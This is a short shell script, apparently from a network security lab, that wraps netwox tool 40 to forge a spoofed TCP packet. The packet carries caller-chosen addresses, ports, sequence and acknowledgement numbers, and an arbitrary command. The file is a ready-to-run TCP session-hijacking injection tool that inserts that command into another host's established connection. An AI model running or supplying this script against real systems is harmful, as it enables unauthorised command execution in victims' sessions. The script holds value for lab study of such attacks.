#!/bin/sh

if [ ! $# -eq 8 ]; then
    echo "Netwox Tool 40: Spoof Ip4Tcp Packet"
    echo "Usage: $0 <src-ip> <dest-ip> <src-port> <dst-port> <seqnum> <acknum> <winsize> <command>"
    exit 0
fi

echo Executing: sudo netwox 40 \
 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 \
 --ip4-src $1 --ip4-dst $2 --ip4-opt \"\" \
 --tcp-src $3 --tcp-dst $4 \
 --tcp-seqnum $5 --tcp-acknum $6 --tcp-ack \
 --tcp-psh --tcp-window $7 --tcp-opt \"\" \
 --tcp-data \"\'$8\'0d0a\" --spoofip \"best\"

sudo netwox 40 \
--ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 \
--ip4-src $1 --ip4-dst $2 --ip4-opt "" \
--tcp-src $3 --tcp-dst $4 \
--tcp-seqnum $5 --tcp-acknum $6 --tcp-ack \
--tcp-psh --tcp-window $7 --tcp-opt "" \
--tcp-data "'$8'0d0a" --spoofip "best"
